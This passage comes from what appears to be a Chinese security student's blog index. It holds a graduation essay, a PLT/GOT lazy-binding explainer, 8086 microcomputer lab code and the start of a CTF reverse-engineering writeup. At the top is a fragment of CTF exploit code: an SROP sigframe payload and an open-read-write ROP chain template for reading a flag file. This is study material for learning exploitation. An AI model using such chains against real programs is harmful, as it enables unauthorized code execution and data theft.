0x0\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\npayload = p64(start_addr) + p64(syscall_ret) + str(sigframe)\n```\n\n![image-20230526212409044](https://files.catbox.moe/fkrp1r.png)\n\nsetcontext+53 + orw的利用，orw模板\n\n```python\norw  = p64(pop_rdi) + p64(FLAG)\norw += p64(pop_rsi) + p64(0)\norw += p64(pop_rax) + p64(2)\norw += p64(syscall)\norw += p64(pop_rdi) + p64(3)\norw += p64(pop_rsi) + p64(heap_base + 0x3000)\norw += p64(pop_rdx) + p64(0x31)\norw += p64(read)\norw += p64(pop_rdi) + p64(1)\norw += p64(write)\n```\n\n","tags":["KNOWLEDGE","stack"],"categories":["LEARNING"]},{"title":"观毕业季有感","url":"/2020/06/20/Graduation/","content":"\n------\n\n\n\n如果有一群人在你生命的某一时间突然闯进你的生活，相处四年之后又悄然离开\n\n如果有个地方任凭你挥洒青春，多年后却只能留在你的回忆之中\n\n会是什么感受？\n\n宿舍楼挂起气球，画上板报，欢送毕业生\n\n退办宿舍点，旧书回收点，行李托运点，全套服务，不请自来\n\n一年一度的毕业季又到了。\n\n每年这个时候都颇有感触，今年也是，\n\n校园里多了许多拖着行李箱的人，他们的内心什么感受，走在路上实在难以揣测\n\n大学四年走到终点，或许应该像电影里像书里像歌里那样一起缅怀逝去的青春\n\n也或许忙着论文忙着答辩忙着复试忙着找工作而匆匆一顿饭就说了再见\n\n他们脸上似乎流露着轻松和释然，却又有些伤感\n\n或者感慨万千而表现得很平淡，我不好说\n\n图书馆、镜湖周围，多了许多拍毕业照的人\n\n他们穿着这辈子唯一一次也可能是最后一次的毕业服\n\n身边站着这辈子可能再也见不到的同学\n\n脚下踩着这辈子可能再也回不来的母校\n\n脸上洋溢着这辈子可能最百感交集的笑容\n\n帽子扔到天空的一瞬间，也意味着，真到了说再见的时候\n\n昨天和舍友坐着小黄车去学院楼上课，身旁坐着一位毕业生，他和司机一直在交谈\n\n“最后一次坐学校的小黄了，师傅，东门”\n\n“带你绕一圈吧，顺便再看看学校的风景”\n\n路程不远，但聊了很多。\n\n晚上考完试回来，路经二食堂听到有人在唱歌，\n\n台阶下三人抱着吉他轻唱，歌很慢，很柔，很好听\n\n台阶上坐得满满的人，我知道都是毕业生，他们三五成群靠在一起，有朋友，有情侣，有像我一样的围观者\n\n有的谈笑风生，有的拍照留念，有的陷入深思，有的低声抽泣，\n\n再往前走，很多人聚在一起告别，大家语气都很快乐，像是团建过后，第二天还会再相见。\n\n同行四年，同学一场，天各一方，皆是性情中人，为离别而感伤，理所当然\n\n至于有人说太媚俗，道不同，你可能无法理解\n\n毕业季像是一篇诗歌的终章，又是另一篇文章的序章\n\n当你离开校门的那一刻，就意味着你要和过去做个了断，和那些朋友们做个告别\n\n转眼我也步入大三，我实在难以想像我毕业时会是什么感受\n\n可能再也吃不到天天吐槽的食堂大妈的饭菜\n\n想打球再也找不到随叫随到的兄弟\n\n上网买东西淘宝收货地址再也不能填学校\n\n最重要的是那些陪你走过青春的人\n\n那些你曾以为无比重要的人生节点\n\n那些你以为不可或缺的人\n\n当真到了要说再见的时候\n\n我会是什么感受？\n\n\n\n\n\n> 夕阳下的花径。\n>\n> 我同朋友挥手告别，向前走去。\n>\n> 两个同学在前面走着。\n>\n> 八重樱花落了一地。\n>\n> 再抬头，走在前面的同学消失在了风里。\n>\n> 电线杆上的飞鸟惊起，向远方飞去。\n>\n> 我再也没有见过那只飞鸟。\n\n\n\n<img src=\"https://i.loli.net/2020/06/21/FNHuRqDbTyWIa3L.png\" alt=\"image-20200621000130902\" style=\"zoom: 33%;\" />","tags":["PERSONALITY"],"categories":["LIFE"]},{"title":"学习PLT表GOT表","url":"/2020/06/16/GOTPLT/","content":"\n# 对PLT表和GOT表的浅显理解\n\n之前做PWN题的时候了解过一点plt表和got表——plt表可跳转到got表，got表里存放着函数的真实地址\n\n今天巧合在网上翻到一篇用gdb调试plt表和got表关系的博客，这才对它有了进一步的了解。\n\nGOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。\n\n### GOT表构成\n\n为了实现延迟绑定，GOT的头三条表目是特殊的：\n\n> GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;\n>\n> GOT[1]包含动态链接器的标识;\n>\n> GOT[2]包含动态链接器的延迟绑定代码的入口点。\n>\n> GOT的其他表目为本模块要引用的一个全局变量或函数的地址。\n\n### PLT表构成\n\nPLT是一个以16字节(32位平台中)表目的数组形式出现的代码序列。就像GOT表，PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。\n\n### 实现过程\n\n每个定义在共享库中并被本模块调用的函数在PLT中都有一个表目，从PLT[1]开始．模块对函数的调用会转到相应PLT表目中执行，这些表目由三条指令构成。\n\n> 第一条指令是跳转到相应的GOT存储的地址值中．\n>第二条指令把函数相应的ID压入栈中，\n> 第三条指令跳转到PLT[0]中调用动态链接器解析函数地址，并把函数真正地址存入相应的GOT表目中。\n\n被调用函数GOT相应表目中存储的最初地址为相应PLT表目中第二条指令的地址值，函数第一次被调用后．GOT表目中的值就为函数的真正地址。\n\n因此，第一次调用函数时开销比较大．但是其后的每次调用都只会花费一条指令和一个间接的存储器引用。\n\n------\n\n所以第一次函数调用过程如下：\n\n> 1.调用函数找到plt表\n>\n> 2.jmp 相应的got表\n>\n> 3.push got表的下标//相应的标识\n>\n> 4.jmp plt[0]\n>\n> 5.plt[0]的指令转向got[2],进入动态连接器入口\n>\n> //由于GOT[2]中存储的是动态链接器的入口地址，所以通过GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中\n>\n> 6.将真正的函数地址覆盖到got表中\n\n其中2、3、4步（jmp、push、jmp）是第一次调用某函数时进行的三步操作，是实现延时绑定机制的关键\n\n可以理解为这种状态：\n\n![img](https://img-blog.csdnimg.cn/20190831142407693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FsZXhZb3VuZzI4,size_16,color_FFFFFF,t_70)\n\n\n\n![image-20220410004226564](https://s2.loli.net/2022/04/10/1RqExVZ8Dl9bQsp.png)\n\n最后借用一下大佬的动图：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200208160601515.gif)\n\n------\n\n后期补充：\n\n其实具体实现比想象的还要复杂一下，下面是动态链接的过程，也是dl_runtime_resolve需要掌握的\n\n1. dl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址\n2. 而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址\n3. .rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info\n4. 将 r_info>>8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset\n5. .dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名\n6. 在动态链接库里面找这个函数的地址，赋值给 *rel->r_offset，也就是 GOT 表就完成了一次函数的动态链接\n\n![image-20210822212347908](https://i.loli.net/2021/08/22/xzyGeFWMm27wNO4.png)\n\n```c\ntypedef struct {\n    Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址\n    Elf32_Word r_info;      // 符号表索引\n} Elf32_Rel;\n```\n\n`.rel.plt`节是用于函数重定位\n\n`.rel.dyn`节是用于变量重定位\n\n`.got`节保存全局变量偏移表\n\n`.got.plt`节保存全局函数偏移表，对应着`Elf32_Rel`结构中`r_offset`的值\n\n`.dynsym`节包含了动态链接符号表\n\n`.dynstr`节包含了动态链接的字符串\n\n`.plt`节是过程链接表\n","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"微机实验记录","url":"/2020/06/15/Microcomputer/","content":"\n# 0x00前言\n\n今天微机原理接口结课了，好不容易整理出实验报告\n\n顺便以博客的形式记录一下本学期7个微机实验\n\n------\n\n2020.6.19\n\n刚刚考完微机实验，运气好，实验很简单\n\n文章最后记录一下实验过程\n\n------\n\n## 0x01 8255\n\n**1．8255输入、输出实验**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,28BH ；初始化8255\nMOV AL,10001001B\nOUT DX,AL\n\nTEST0:\nMOV DX,28AH ；C口读入开关状态\nIN AL,DX\nMOV DX,289H ；B口输出\nOUT DX,AL\nJMP TEST0 ；继续循环\n\nCODE ENDS\nEND START\n```\n\n\n\n**2．利用8255设计跑马灯（软延时）**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,28BH ；初始化8255\nMOV AL,10001001B；控制字\nOUT DX,AL\nMOV AH,01H ；暂存01位置的灯\n\nTEST0:\nMOV DX,28AH ；从C口读入开关状态\nIN AL,DX\nCMP AL,80H ；如果不是K7开关，则循环等待\nJNZ TEST0\n\nTEST1:\nMOV AL,AH\nMOV DX,289H ；B口输出\nOUT DX,AL\nROL AL,1 ；左移一位\nMOV BX,150H ；两层嵌套循环，软延时\n\nCIRCLE:\nMOV CX,65535\n\nDELAY:\nLOOP DELAY\nDEC BX\nJNZ CIRCLE\nMOV AH,AL ；暂存灯的状态\nJMP TEST0；继续循环\n\nCODE ENDS\nEND START\n```\n\n------\n\n## 0x02 8253\n\n**1．8253定时实验，利用8253完成2秒的延时。**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\n;第一级通道2，方式2，先写低字节，后写高字节\nMOV AL ,00110101B\nMOV DX ,28BH\nOUT DX,AL\nMOV AL,00H;计数初值5000\nMOV DX ,28AH\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;第二级通道0，方式3，先写低字节，再写高字节\nMOV AL,01110111B\nMOV DX,28BH\nOUT DX,AL\nMOV AL,00H;初值800\nMOV DX,288H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\nCODE ENDS\nEND START\n```\n\n\n\n**2．利用8253硬件延时控制跑马灯运行。**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,2ABH；初始化8255\nMOV AL,10001011B\nOUT DX,AL\nMOV AL,01H；暂存第一个灯，保证起始第一个灯亮\nMOV BL,AL\n\nTEST0:\nMOV DX,2AAH;判断是否是开关1\nIN AL,DX\nTEST AL,01H\nJZ TEST0\n\nTEST1:\n;第一级通道0，方式2，先写低字节，后写高字节\nMOV AL ,00110101B\nMOV DX ,28BH\nOUT DX,AL\nMOV AL,00H;计数初值5000\nMOV DX ,28AH\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;第二级通道1，方式3，先写低字节，再写高字节\nMOV AL,01110111B\nMOV DX,28BH\nOUT DX,AL\nMOV AL,00H;初值800\nMOV DX,288H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\n;脉冲2MHz，周期2s\nT3:\nMOV AL,BL\nMOV DX,2A8H\nOUT DX,AL；输出到A口\nROL AL,1;左移一位\nMOV BL,AL；暂存当前灯的位置\n\nT4:\nMOV DX,2A9H；读取两次OUT1状态，判断翻转\nIN AL,DX\nMOV CL,AL\nIN AL,DX\nCMP AL,CL ；没翻转，继续循环\nJZ T4\nJMP TEST1\n\nCODE ENDS\nEND START\n```\n\n------\n\n## 0x03 A/D转换\n\n**1．利用0809完成1个通道的模拟量采集，并利用8255输出二进制码。**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,283H；初始化8255\nMOV AL,10010000B\nOUT DX,AL\n\nNEXT:\nMOV DX,29CH ；虚写，启动一次转换\nOUT DX,AL\n\nTEST0:\nMOV DX,280H \nIN AL,DX ；A口读入EOC状态\nCMP AL,01H ；检查AL的D0是否等于1，若是则转换已经结束\nJNZ TEST0 ；如果不是，继续检查\n\nMOV DX,29CH\nIN AL,DX   ；读入转换后的数据\nMOV DX,282H\nOUT DX,AL ；C口输出\nJMP NEXT\n\nCODE ENDS\nEND START\n\n```\n\n\n\n**2.利用0832产生三角波输出，并在直流电机上观察结果。**\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nBEGIN:\nMOV AL,1AH ；下限电压\n\nUP:\nMOV DX,290H\nOUT DX,AL\nMOV DX,291H\nOUT DX,AL\nMOV BX,20H；两层嵌套循环，软延时\nINC AL；自增\n\nDELAY0:\nMOV CX,65535\n\nDELAY1:\nLOOP DELAY1\nDEC BX\nJNZ DELAY0\n\nCMP AL,100 ；比较是否达到上限值\nJNZ UP ；没到继续上升\n\nDEC AL\nDOWN: \nMOV DX,290H\nOUT DX,AL\nMOV DX,291H\nOUT DX,AL\nMOV BX,20H ；软延时\nDEC AL；自减\n\nDELAY2:\nMOV CX,65535\n\nDELAY3:\nLOOP DELAY3\nDEC BX\nJNZ DELAY2\n\nCMP AL,19H ；比较是否下降到下限值\nJNZ DOWN； 没到继续下降\n\nJMP BEGIN\nCODE ENDS\nEND BEGIN\n```\n\n------\n\n## 0x04 键盘\n\n**实现扫描键盘上的按键，并在数码管上显示**\n\n```assembly\nPORT_A EQU 280H\nPORT_B EQU 281H\nPORT_C EQU 282H\nPORT_CTL EQU 283H\n \nDATA SEGMENT\nTABLE DB 77H,7BH,7DH,7EH,0B7H,0BBH,0BDH,0BEH,0D7H,0DBH,0DDH,0DEH,0E7H,0EBH,0EDH,0EEH\n;TABLE1 DB 40H,79H,24H,30H,19H,12H,02H,78H,00H,18H,08H,03H,46H,21H,06H,0EH;共阴\nTABLE1 DB 0BFH,86H,0DBH,0CFH,0E6H,0EDH,0FDH,87H,0FFH,0E7H,0F7H,0FCH,0B9H, 0DEH,0F9H,0F1H\n;共阳\nDATA ENDS;数据段\n \nSTACK SEGMENT STACK;堆栈段\nDW 50 DUP(0)\nTOP_STACK LABEL WORD;TOP_STACK定义为字类型，偏移地址100\nSTACK ENDS\n\nCODE SEGMENT;代码段\n \nASSUME CS:CODE,DS:DATA,SS:STACK\nSTART:\nMOV AX,STACK\nMOV SS,AX\nLEA SP,TOP_STACK\nMOV AX,DATA\nMOV DS,AX\n;初始化8255，B口输入，A,C口输出 \nMOV DX,PORT_CTL\nMOV AL,10000010B\nOUT DX,AL\nINIT:\nMOV DX,PORT_A;A端口输出低电平\nMOV AL,00H\nOUT DX,AL\nMOV DX,PORT_B\n \nWAIT_OPEN:\nIN AL,DX;判断按键是否都松开\nAND AL,0FH;取低四位（列值）\nCMP AL,0FH\nJNZ WAIT_OPEN;若有键没有松开，就循环检查\n \nWAIT_PRES:\nIN AL,DX;判断是否有键按下\nAND AL,0FH;取低四位列值\nCMP AL,0FH\nJE WAIT_PRES;若没有键按下，则循环检查\n \nMOV CX,16EAH;消除键抖动，延时20ms\nDELAY:LOOP DELAY\n \nIN AL,DX;再次检查，看键是否仍被压着\nAND AL,0FH\nCMP AL,0FH\nJE WAIT_PRES\n \nMOV AL,0FEH;先使D0=0\nMOV CL,AL;CL=1111 1110B\n \nNEXT_ROW:\nMOV DX,PORT_A\nOUT DX,AL ;A口第一行输出低电平\nMOV DX,PORT_B\nIN AL,DX ;B口读取状态\nAND AL,0FH;取低四位列值\nCMP AL,0FH\nJNE ENCODE;不为零表示有键按下，转到ENCODE\nROL CL,01;若无键按下，循环左移，使下一行输出低电平\nMOV AL,CL\nJMP NEXT_ROW\n \nENCODE:MOV BX,000FH;从下标F开始\nIN AL,DX\nNEXT_TRY:CMP AL,TABLE[BX];在表中寻找与读入的状态相等的值\nJE DONE;若找到则跳转DONE\nDEC BX;没找到，指向下一个地址\nJNS NEXT_TRY;没有减到0，则循环检查\nMOV AH,01\nJMP EXIT;小于零则，报错退出\nDONE:\nMOV AL,TABLE1[BX];在数码管表中找到相应数字\nAND AL,7FH;消除小数点\nMOV DX,PORT_C\nOUT DX,AL;C口输出，显示在数码管上\nJMP INIT;重新循环，读入下一个按键\nEXIT:HLT\nCODE ENDS\nEND\n```\n\n------\n\n# 进阶区\n\n## 0x10 来自热心同学小张\n\n​\t要求：当0809 采集数据超过4.5V 时，由 8253 提供 0.5 秒控制 8255 输出8个发光二极管中的红灯闪烁。当低于4.5V时输出正常的二进制值。\n​\t0809 地址为 298H~29FH，8253 0 通道地址 2A8H, 8255 控制口地址 293H， 8253 通道 1 工作方式 2，8253 通道 0 工作方式 3。\n\n```assembly\nCODE SEGMENT\n ASSUME CS:CODE\n START:\n      MOV DX,293H      ;写入8255控制口\n      MOV AL,10011001B ;控制字，AC输入B输出\n      OUT DX,AL ;写入控制字\nL1: MOV DX,298H   ;0809控制\n    OUT DX,AL     ;虚写\nL2: MOV DX,292H  ;8255 C口，读入0809状态\n    IN AL,DX\n    TEST AL,01H   \n    JZ L2          ;测试是否准备好\n   \n    MOV DX,298H   ;\n    IN AL,DX ; \n   \n    CMP AL,0E6H  ;与4.5V比较 ，小于4.5 跳到 OUT2 转换二进制\n    JB OUT2\n    ;8253\n    MOV DX,2ABH        ;8235控制口\n    MOV AL,01110101B   ;控制字\n    OUT DX,AL    ;读入控制字\n    MOV AL,00H ;初值\n    MOV DX,2A9H ;1 通道 1\n    OUT DX,AL\n    MOV AL,10H ;初值\n    MOV DX,2A9H ;1通道1\n    OUT DX,AL\n    MOV DX,2ABH   ;控制口\n    MOV AL,00110111B;控制字\n    OUT DX,AL\n    MOV AL,00H  ;初值\n    MOV DX,2A8H ;0 通道 2\n    OUT DX,AL\n    MOV AL,10H   ;初值\n    MOV DX,2A8H ; 0通道 2\n    OUT DX,AL\n\n  OUTO:\n    MOV DX,291H             ;8255B口输出\n    MOV AL,10011100B        ;红灯亮\n    OUT DX,AL\n   \n;硬延时判断\n  MOV DX,290H ;A口读取8253状态       \nLOOP1:\n  IN AL,DX\n  TEST AL,00000001B  ;测试高低电频变化\n  JZ LOOP1\n \nLOOP2:\n  IN AL,DX\n  TEST AL,00000001B ;测试高低电频变化\n  JNZ LOOP2\n   \n   MOV AL,00H      ;灯暗\n   MOV DX,291H\n   OUT DX,AL\n;硬延时\nMOV DX,290H\nLOOP3:\n  IN AL,DX\n  TEST AL,00000001B ;测试高低电频\n  JZ LOOP3\n \n\nLOOP4:\n  IN AL,DX\n  TEST AL,00000001B ;测试高低电频变化\n  JNZ LOOP4   \n  \n  MOV BX,200H\n  JMP L1  ;跳回，测试0809数值\n   \nOUT2:\n  MOV DX,291H  ;直接输出二进制\n  OUT DX,AL\n\n  JMP L1    ;跳回\nCODE ENDS\nEND START\n\n```\n\n------\n\n## 0x02 来自[一叶飘零](https://skysec.top/)学长\n\n利用0809采集数据，转换后用IN5打到数码管上\n\n```assembly\nPORT_A EQU 290H\t\t;8255A口地址\nPORT_B EQU 291H\t\t;8255B口地址\nPORT_C EQU 292H\t\t;8255C口地址\nPORT_CTL EQU 293H\t;8255控制口地址\nDATA SEGMENT\n;数码管表,共阳（实验是共阴，所以要取反）\n;           0   1   2   3   4   5   6   7\nTUBE\tDB 40H,79H,24H,30H,19H,12H,02H,78H\n;           8   9   A   B   C   D   E   F\n\t    DB 00H,10H,08H,03H,46H,21H,06H,0EH\nDATA ENDS\nCODE\tSEGMENT\n\tASSUME\tCS:CODE,DS:DATA\nSTART:\n\tMOV AX,DATA\n\tMOV DX,AX\n\tMOV DX,PORT_CTL\t\t;初始化8255\n\tMOV AL,10010001B\t;A口输入，读值，B口输出，打到数码管，C口输入，PC0接EOC判断用\n\tOUT DX,AL\nNEXT:\tMOV DX,280H\t\t;指向ADC通道0\n\tOUT DX,AL\t\t;启动转换\n\tMOV DX,PORT_C\t\t;指向8255的C口\nPOLL:\n\tIN AL,DX\t\t;读C口值\n\tTEST AL,01H\t\t;测试PC0是否为1\n\tJZ POLL\t\t\t;是0，转换未结束，继续等待\n\tMOV AL,10000000B\n\tMOV DX,PORT_C\n\tOUT DX,AL\n\tMOV DX,280H\t\t;是1，转换结束，指向ADC通道0\n\tIN AL,DX\t\t;读取转换后数据\t\t\n\tAND AL,0FH\t\t;取低4位\n\tMOV BX,OFFSET TUBE\t;指向数码管表\n\tXLAT\n\tNOT AL\t\t\t;取反\n\tMOV DX,PORT_B\t\t;指向8255的B口\n\tOUT DX,AL\t\t;将低4位值显示在数码管上\n\tMOV BX,15\nDELAY:\t\t\t\t;双重延时\n\tMOV CX,0FFFFH\nDELAY1:\n\tLOOP DELAY1\n    \tDEC BX\n\tJNZ DELAY\n\tMOV AL,01000000B\n\tMOV DX,PORT_C\n\tOUT DX,AL\n\tMOV DX,280H\t\t;延时结束后，再指回ADC的通道0\n\tIN AL,DX\t\t;再读一次数据\n\tAND AL,0F0H \t\t;取高4位\n\tMOV CL,4\n\tROR AL,CL\n\tMOV BX,OFFSET TUBE\t;指向数码管表\n\tXLAT\n\tNOT AL\t\t\t;取反\n\tMOV DX,PORT_B\t\t;指向8255的B口\n\tOUT DX,AL\t\t;将高4位值显示在数码管上\n\tMOV BX,15\t\nDELAY2:\t\t\t\t;再次双重延时\n\tMOV CX,0FFFFH\nDELAY3:\n\tLOOP DELAY3\n    \tDEC BX\n\tJNZ DELAY2\n\tJMP NEXT\t\t;延时结束，跳回NEXT，进行一下轮实现\nCODE ENDS\n\tEND START\n```\n\n------\n\n## 0x03 实现左右轮循环跑马灯\n\n利用8253提供定时时间（2秒），8255输出至发光二极管，显示要求为：从左向右移位显示一次循环，然后从右向左移位显示一次循环。8253控制口地址283H，8255控制口地址293H。\n\n\n\n```assembly\nORT_A EQU 290H\t\t\t;8255A口地址\nPORT_B EQU 291H\t\t\t;8255B口地址\nPORT_C EQU 292H\t\t\t;8255C口地址\nPORT_CTL EQU 293H\t\t;8255控制口地址\n\nPORT_1 EQU 280H\nPORT_2 EQU 281H\nPORT_3 EQU 282H\nPORT_CTL2 EQU 283H\n\nSTACK SEGMENT STACK\n\tDB 50 DUP(?)\nTOP_S\tLABEL WORD\nSTACK ENDS\n\nCODE SEGMENT\n\tASSUME CS:CODE,SS:STACK\n\nSTART:\n\tMOV AX,STACK\n\tMOV SS,AX\n\tLEA SP,TOP_S\n\n\tMOV AL,00110101B\t;8253的通道0，先送低字节，再送高字节，方式2，BCD码\n\tMOV DX,PORT_CTL2\n\tOUT DX,AL\t\t;8253初始化\n\tMOV AL,00H\t\t;向8253的通道0，N0赋5000\n\tMOV DX,PORT_1\n\tOUT DX,AL\n\tMOV AL,50H\n\tMOV DX,PORT_1\n\tOUT DX,AL\t\t\n\n\tMOV AL,01110111B\t;8253的通道1，先送低字节，再送高字节，方式3，BCD码\n\tMOV DX,PORT_CTL2\n\tOUT DX,AL\t\t;8253初始化\n\tMOV AL,00H\t\t;向8253的通道1，N1赋800\n\tMOV DX,PORT_2\n\tOUT DX,AL\n\tMOV AL,08H\t\t\n\tMOV DX,PORT_2\n\tOUT DX,AL\n\t\n\tMOV DX,PORT_CTL\t\t;8255初始化\n\tMOV AL,10011001B\t;B端口输出,A端口控制输入,C端口延时输入\n\tOUT DX,AL\n\tMOV AL,10000000B\t;先亮最左边的灯\n\tPUSH AX\t\t\t;压栈\n\nTEST1:\t\n\tMOV DX,PORT_B\t\t;B口输出\n\tPOP AX\t\t\t;AL出栈\n\tOUT DX,AL\n\tPUSH AX\t\t\t;将此时的AL再压栈\n\n\tcmp AL,00000001B\t;看有没有到右边\n\tJZ TEST2\t\t;到右边了即跳到test2\n\nDELAY1:\t\t\t\t;延时\n\tMOV DX,PORT_C\n\tIN AL,DX\n\tAND AL,00000001B\t;取PC0\n\tCMP AL,00000001B\n\tJZ DELAY1\t\t;低电平跳出\nDELAY2:\n\tIN AL,DX\n\tAND AL,00000001B\t;取PC0\n\tCMP AL,00000001B\n\tJNZ DELAY2\t\t;高电平跳出\n\t\n\n\tPOP AX\t\t\t;AL出栈\n\tROR AL,01\t\t;循环右移\n\tPUSH AX\t\t\t;AL再压栈\n\tJMP TEST1\t\t;返回TEST1\n\nTEST2:\t\n\tMOV DX,PORT_B\t\t\n\tPOP AX\t\t\t;此时AL=00000001B\n\tOUT DX,AL\t\t;亮最右边的灯\n\tPUSH AX\t\t\t\n\tCMP AL,10000000B\t;看是否亮到了最左边的灯\n\tJZ TEST1\t\t;是，跳回TEST1\n\nDELAY3:\n\tMOV DX,PORT_C\n\tIN AL,DX\n\tAND AL,00000001B\t;取PC0\n\tCMP AL,00000001B\n\tJZ DELAY3\t\t;低电平跳出\nDELAY4:\n\tIN AL,DX\n\tAND AL,00000001B\t;取PC0\n\tCMP AL,00000001B\n\tJNZ DELAY4\t\t;高电平跳出\n\t\n\n\tPOP AX\n\tROL AL,01\t\t;循环左移\n\tPUSH AX\n\tJMP TEST2\n\nCODE ENDS\n\tEND START\n```\n\n------\n\n## 0x04记微机实验考试\n\n> 要求：利用8253提供定时时间（1秒），8255输出为跑马灯形式至发光二极管。显示要求为从左向右每次移2位循环4次，然后以8253以2秒延时从右向左每次移1位循环5次后灯全\n> 亮后停止。控制跑马灯暂停键为K4键，当K4键位时暂停。\n> 8253 控制口地址 2A3H,8255A 口地址 2B0H。\n\n拿到题目的一瞬间全组狂喜，\n\n很简单，8255、8253两个芯片，两个硬延时就可以了\n\n但是一个看似三十分钟程序却做了将近一个半小时，事情是这样的\n\n在写完第一个延时后，本想先测试一下效果，但正常测试几次后LED灯突然就不亮了\n\n？？？疑惑，研究了好久，写了程序测试小灯、换线，最后直接5v接上，还是不行\n\n而且小灯的迷惑行为止不亮这么简单，它的亮灭随机的，不断调整线的位置并且分析灯的亮灭规律我们断定——箱子坏了\n\n没办法，找老师，老师瞄了一眼，“线有问题，换线就好......”\n\n心态崩了，明知道换线行不通，又不好意思让老师来帮忙找问题，没办法自己来吧\n\n就这样估计半个小时过去了，突然萄萄调线的时候动了一下电源插头\n\n！！！！灯亮了，竟然没想过是电源接触的问题\n\n打扰了，问题解决后\n\n接着很快代码完成，应该是第一组完成\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,2B3H ;初始化8255\nMOV AL,10010010B\nOUT DX,AL\nMOV AL,80H ;暂存第8个灯，保证起始灯亮\nMOV AH,AL\nMOV BX,4\nTEST1:\n;第一级通道0，方式2，先写低字节，后写高字节\nMOV AL ,00110101B\nMOV DX ,2A3H\nOUT DX,AL\nMOV AL,00H;计数初值5000\nMOV DX ,2A0H\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;第二级通道1，方式3，先写低字节，再写高字节\nMOV AL,01110111B\nMOV DX,2A3H\nOUT DX,AL\nMOV AL,00H;初值400\nMOV DX,2A1H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\n;脉冲2MHz，周期2s\nTEST0:\nMOV DX,2B1H ;判断是否是开关K4\nIN AL,DX\nTEST AL,10H\nJZ TEST0\nT3:\nMOV AL,AH\nMOV DX,2B2H\nOUT DX,AL;输出到C口\nROR AL,2;右移两位\nMOV AH,AL;暂存当前灯的位置\nT4:         \nMOV DX,2B0H     ;延时\nIN AL,DX\nTEST AL,01H\nJNZ T4\nDEC BX\nJNZ TEST1\n\nMOV BX,5\nTESTA:\n;第一级通道0，方式2，先写低字节，后写高字节\nMOV AL ,00110101B\nMOV DX ,2A3H\nOUT DX,AL\nMOV AL,00H;计数初值5000\nMOV DX ,2A0H\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;第二级通道1，方式3，先写低字节，再写高字节\nMOV AL,01110111B\nMOV DX,2A3H\nOUT DX,AL\nMOV AL,00H;初值400\nMOV DX,2A1H\nOUT DX,AL\nMOV AL,16H\nOUT DX,AL\n;脉冲2MHz，周期4s\n\nTESTB:\nMOV DX,2B1H ;判断是否是开关K4\nIN AL,DX\nTEST AL,10H\nJZ TESTB\nMOV AL,AH\nMOV DX,2B2H\nOUT DX,AL;输出到C口\nROL AL,1;左移一位\nMOV AH,AL;暂存当前灯的位置\nTC:         \nMOV DX,2B0H     ;延时\nIN AL,DX\nTEST AL,01H   \nJNZ TC\nDEC BX\nJNZ TESTA\nLOOP1:\nMOV AL,0FFH \nMOV DX,2B2H\nOUT DX,AL;输出到C口\nJMP LOOP1\n\nCODE ENDS\nEND START\n```\n\n遗憾的是老师竟然没问我什么问题，\n\n总的来说考试还算顺利，收拾书包走人...\n\n## 0x05 小结\n\n从第一次接触汇编到现在也算有点收获，虽然只是一些皮毛\n\n但学习二进制以后还会经常和汇编打交道，现在混个脸熟，将来慢慢深入了解也不迟\n\n暂时告别芯片和箱子，我会想你的，ﾉBye~","tags":["Assembly"],"categories":["DEVELOP"]},{"title":"2020 网鼎杯_signal","url":"/2020/06/14/signal/","content":"\n# 0x00 前言\n\n之前网鼎杯的逆向题，说实话，这是我第一次见虚拟机的逆向\n\n现在已经深夜了，害怕第二天就忘了，所以赶紧记下来\n\n------\n\n已经第二天了，刚刚写出脚本，回来接着写\n\n说实话第一次见虚拟机的题目还挺有新鲜感的\n\n不过真正吃透一道题也不容易（还是自己太菜）\n\n本题三种解法我了解的差不多了，当作笔记好好记录一下\n\n------\n\n## 0x01 程序分析\n\n主函数：\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [esp+18h] [ebp-1D4h]\n\n  __main();\n  qmemcpy(&v4, &unk_403040, 0x1C8u);\n  vm_operad(&v4, 114);\n  puts(\"good,The answer format is:flag {}\");\n  return 